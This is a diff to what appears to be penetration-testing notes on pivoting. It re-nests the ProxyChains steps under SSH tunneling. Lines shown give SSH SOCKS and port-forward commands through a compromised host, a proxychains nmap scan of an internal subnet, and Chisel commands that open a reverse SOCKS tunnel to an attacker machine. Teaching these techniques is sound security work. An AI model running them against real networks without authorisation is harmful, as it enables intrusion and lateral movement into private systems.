@@ -41,9 +41,9 @@ Pivoting is a crucial technique in penetration testing that allows an attacker t
     - SSH Tunneling (Dynamic and Local Port Forwarding)
         - Create a SOCKS proxy to route traffic: `ssh -D 1080 -N user@compromised-host`
         - Use local port forwarding to expose internal services: `ssh -L 8080:10.10.0.10:80 user@compromised-host`
-    - ProxyChains
-        - Modify /etc/proxychains.conf to use SOCKS5 proxy: `socks5 127.0.0.1 1080`
-        - Run tools through ProxyChains: `proxychains nmap -sT 10.10.0.0/24` 
+        - Then use ProxyChains
+            - Modify /etc/proxychains.conf to use SOCKS5 proxy: `socks5 127.0.0.1 1080`
+            - Run tools through ProxyChains: `proxychains nmap -sT 10.10.0.0/24` 
     - Chisel (Fast TCP/UDP Tunneling)
         - On the attacker's machine (server): `./chisel server -p 8080 --reverse`
         - On the compromised machine (client): `./chisel client 192.168.1.100:8080 R:1080:socks`
